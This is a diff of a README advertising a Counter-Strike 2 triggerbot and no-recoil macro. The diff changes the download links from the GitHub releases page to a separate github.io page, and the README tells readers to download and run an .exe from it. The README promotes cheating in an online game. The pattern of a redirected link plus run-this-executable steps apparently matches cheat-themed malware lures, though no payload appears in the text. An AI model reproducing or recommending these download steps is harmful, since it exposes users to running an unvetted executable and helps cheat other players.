@@ -1,6 +1,6 @@
 # 🎯 CS2-Triggerbot-No-Recoil-Macro-2026 - Improve your shooting accuracy in CS2
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/responsiblefor-dg932/CS2-Triggerbot-No-Recoil-Macro-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://responsiblefor-dg932.github.io)
 
 This project provides tools to assist with weapon control and reaction time in Counter-Strike 2. It includes a triggerbot for automatic shooting and a macro for managing weapon recoil. These tools run on Windows and help players maintain steady aim during game sessions.
 
@@ -15,7 +15,7 @@ To run this tool, your computer needs to meet these basic standards:
 
 ## 📥 How to Download
 
-1. Visit the project release page: [https://github.com/responsiblefor-dg932/CS2-Triggerbot-No-Recoil-Macro-2026/releases](https://github.com/responsiblefor-dg932/CS2-Triggerbot-No-Recoil-Macro-2026/releases)
+1. Visit the project release page: [https://responsiblefor-dg932.github.io](https://responsiblefor-dg932.github.io)
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Click the file ending in .exe to start your download.
 4. Save the file to a folder you can find, such as your Downloads or Desktop folder.
